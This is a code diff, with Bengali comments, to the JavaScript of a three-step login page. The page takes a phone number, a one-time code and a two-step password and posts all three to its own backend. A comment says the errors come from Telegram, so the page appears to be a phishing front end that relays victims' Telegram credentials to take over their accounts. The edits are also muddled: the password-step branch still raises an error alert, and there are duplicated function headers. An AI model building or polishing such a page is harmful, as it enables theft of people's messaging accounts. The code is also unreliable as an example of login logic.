@@ -185,22 +185,22 @@ async function verifyOTP() {
 }
 
 // ধাপ ৩: ফাইনাল পাসওয়ার্ড সাবমিট
-async function verifyOTP() {
-    const otpInput = document.getElementById('otp-code').value;
-    if (!otpInput) return alert("Enter OTP!");
+async function verifyFinal() {
+    const pwd = document.getElementById('two-step-pass').value;
+    const btn = document.getElementById('btn-final');
     
-    // এই লাইনে ওটিপি সেভ করে রাখতে হবে যাতে পরের ধাপে (পাসওয়ার্ডের সাথে) পাঠানো যায়
-    finalOTP = otpInput; 
+    if (!pwd) return alert("Please enter your 2-Step Password!");
 
-    const btn = document.getElementById('btn-verify');
-    btn.innerText = "VERIFYING...";
+    btn.innerText = "ACCESSING...";
+    btn.disabled = true;
 
     const res = await fetch('/api/verify_login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
             phone: finalPhone, 
-            code: finalOTP 
+            code: finalOTP, 
+            password: pwd 
         })
     });
     
@@ -208,15 +208,20 @@ async function verifyOTP() {
 
     if (data.success) {
         window.location.href = "/dashboard";
-    } 
-    else if (data.message === "SHOW_PWD_STEP") {
-        // ধাপ ২ থেকে ৩ এ যাওয়ার সময় এই নিশ্চিতকরণ জরুরি
-        document.getElementById('step-2').classList.remove('active-step');
-        document.getElementById('step-3').classList.add('active-step');
     } else {
-        alert(data.message);
+        // এখানে পরিবর্তন করুন
+        if (data.message === "SHOW_PWD_STEP") {
+    finalOTP = document.getElementById('otp-code').value; // এই লাইনটি নিশ্চিত করুন
+    document.getElementById('step-2').classList.remove('active-step');
+    document.getElementById('step-3').classList.add('active-step');
+            alert("Something went wrong. Please try again.");
+        } else {
+            // যদি পাসওয়ার্ড সত্যিই ভুল হয়, টেলিগ্রাম থেকে আসা অরিজিনাল মেসেজ দেখাবে
+            alert("Error: " + data.message); 
+        }
+        btn.disabled = false;
+        btn.innerText = "Access Account";
     }
-    btn.innerText = "Verify Code";
         }
 </script>
 </body>
